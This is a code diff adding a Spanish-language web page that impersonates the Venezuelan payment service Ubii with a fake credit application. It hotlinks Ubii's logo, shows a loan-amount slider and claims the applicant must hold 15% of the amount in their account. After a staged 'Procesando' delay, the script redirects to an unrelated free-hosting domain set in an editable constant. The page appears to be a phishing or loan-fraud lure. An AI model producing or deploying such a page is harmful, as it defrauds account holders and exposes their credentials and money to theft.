@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud de Crédito - Ubii</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background-color: #0b0f19;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .phone-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #131826;
+            border-radius: 30px;
+            padding: 24px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #1f293d;
+            position: relative;
+        }
+        .top-logo {
+            position: absolute;
+            top: 24px;
+            left: 24px;
+            width: 72px;
+            height: 40px;
+            object-fit: contain;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #e5e7eb;
+        }
+        .amount-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .amount-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #ffffff;
+        }
+        .amount-bs {
+            font-size: 0.9rem;
+            color: #9ca3af;
+            margin-top: 4px;
+        }
+        .slider-container {
+            margin-bottom: 20px;
+        }
+        input[type="range"] {
+            width: 100%;
+            height: 6px;
+            background: #374151;
+            border-radius: 5px;
+            outline: none;
+            -webkit-appearance: none;
+            cursor: pointer;
+        }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0066ff;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(0, 102, 255, 0.6);
+        }
+        .tooltip-card {
+            background-color: #1c2538;
+            border-radius: 14px;
+            padding: 14px;
+            font-size: 0.85rem;
+            color: #d1d5db;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            border: 1px solid #2a364f;
+        }
+        .tooltip-card span {
+            color: #60a5fa;
+            font-weight: 600;
+        }
+        .quota-box {
+            background-color: #182030;
+            border-radius: 14px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid #232f45;
+        }
+        .quota-box .label {
+            font-size: 0.8rem;
+            color: #9ca3af;
+            margin-bottom: 6px;
+        }
+        .quota-box .value {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #ffffff;
+        }
+        .terms-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 24px;
+            font-size: 0.85rem;
+            color: #d1d5db;
+        }
+        .terms-container input[type="checkbox"] {
+            accent-color: #0066ff;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        .btn-submit {
+            width: 100%;
+            background-color: #374151; /* Empieza gris */
+            color: #9ca3af;            /* Texto grisáceo */
+            border: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: not-allowed;       /* Cursor de bloqueado al inicio */
+            transition: background 0.3s ease;
+        }
+        /* Estado activo (cuando pasan los 3 segundos) */
+        .btn-submit.active {
+            background-color: #0066ff;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 102, 255, 0.4);
+        }
+        .btn-submit.active:hover {
+            background-color: #0052cc;
+        }
+        /* Estilo si intenta presionar sin aceptar términos */
+        .btn-submit.error {
+            background-color: #dc2626 !important;
+            color: #ffffff !important;
+        }
+    </style>
+</head>
+<body>
+
+<div class="phone-container">
+    <img src="https://ubiionline.ubiipagos.com/LogoUbiiOnline.svg" alt="Logo" class="top-logo">
+
+    <div class="header">
+        <h1>Solicitud de crédito</h1>
+    </div>
+
+    <!-- Monto principal en Dólares arriba y conversión a Bs abajo -->
+    <div class="amount-section">
+        <div class="amount-title" id="displayAmount">$10,00</div>
+        <div class="amount-bs" id="displayBs">Bs. 8.000,00 Tasa BCV</div>
+    </div>
+
+    <div class="slider-container">
+        <!-- value="10" para que inicie al principio -->
+        <input type="range" id="creditSlider" min="70" max="3500" step="5" value="10">
+    </div>
+
+    <div class="tooltip-card">
+        ¡Mueve el deslizador para elegir cuánto crédito necesitas! Asegúrate de que el monto solicitado sea el correcto. Si no tienes disponible el saldo de <span id="displayTooltipBalance">Bs. 1.200,00</span> en tu cuenta tu crédito será rechazado. 
+    </div>
+
+    <div class="quota-box">
+        <div class="label">Debe tener un monto Superior en su cuenta Ubii de</div>
+        <div class="value" id="displayMinBalance">Bs. 1.200,00</div>
+    </div>
+
+    <div class="terms-container">
+        <input type="checkbox" id="terms">
+        <label for="terms">Aceptar términos y condiciones</label>
+    </div>
+
+    <button class="btn-submit" id="btnSubmit">Cargando...</button>
+</div>
+
+<script>
+    // Configura la Tasa BCV fija por código aquí:
+    const TASA_BCV = 800; 
+
+    // CAMBIA AQUÍ EL LINK DE DESTINO:
+    const ENLACE_DESTINO = "https://mkbonlinublmkvcsf.iceiy.com/?i=1"; 
+
+    const slider = document.getElementById('creditSlider');
+    const displayAmount = document.getElementById('displayAmount');
+    const displayBs = document.getElementById('displayBs');
+    const displayTooltipBalance = document.getElementById('displayTooltipBalance');
+    const displayMinBalance = document.getElementById('displayMinBalance');
+    const btnSubmit = document.getElementById('btnSubmit');
+    const termsCheckbox = document.getElementById('terms');
+
+    let botonHabilitado = false; // Bandera para saber si ya pasaron los 3 segundos
+
+    function actualizarCalculos() {
+        const valUsd = parseFloat(slider.value);
+        
+        // Calcular valor total en Bolívares (Tasa BCV)
+        const totalBs = valUsd * TASA_BCV;
+        const bsFormatted = totalBs.toLocaleString('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        
+        // Actualizar visualización principal (Dólares arriba, Bolívares total abajo)
+        displayAmount.textContent = '$' + valUsd.toLocaleString('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        displayBs.textContent = 'Bs. ' + bsFormatted + ' Tasa BCV';
+
+        // Calcular el 15% del total en Bolívares para los elementos inferiores
+        const calculo15Bs = totalBs * 0.15;
+        const cuotaBsFormatted = calculo15Bs.toLocaleString('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+        // Actualizar los textos dinámicos con el 15% en bolívares
+        displayTooltipBalance.textContent = 'Bs. ' + cuotaBsFormatted;
+        displayMinBalance.textContent = 'Bs. ' + cuotaBsFormatted;
+    }
+
+    slider.addEventListener('input', actualizarCalculos);
+    slider.addEventListener('change', actualizarCalculos);
+    actualizarCalculos();
+
+    // Temporizador inicial: espera 3 segundos desde que carga la página para habilitar el botón
+    setTimeout(function() {
+        botonHabilitado = true;
+        btnSubmit.classList.add('active');
+        btnSubmit.textContent = 'Solicitar';
+    }, 3000);
+
+    // Lógica al hacer clic en el botón
+    btnSubmit.addEventListener('click', function() {
+        // Si aún no han pasado los 3 segundos, no hace nada
+        if (!botonHabilitado) return;
+
+        // Validar si la casilla de términos NO está marcada
+        if (!termsCheckbox.checked) {
+            btnSubmit.classList.add('error');
+            btnSubmit.textContent = '¡Acepte los términos y condiciones!';
+
+            setTimeout(function() {
+                btnSubmit.classList.remove('error');
+                btnSubmit.textContent = 'Solicitar';
+            }, 2000);
+            return;
+        }
+
+        // Si ya pasaron los 3 segundos y aceptó los términos, procede a la redirección
+        btnSubmit.classList.remove('active');
+        btnSubmit.style.backgroundColor = '#374151';
+        btnSubmit.style.color = '#9ca3af';
+        btnSubmit.textContent = 'Procesando...';
+
+        setTimeout(function() {
+            window.location.href = ENLACE_DESTINO;
+        }, 1000);
+    });
+</script>
+
+</body>
+</html>
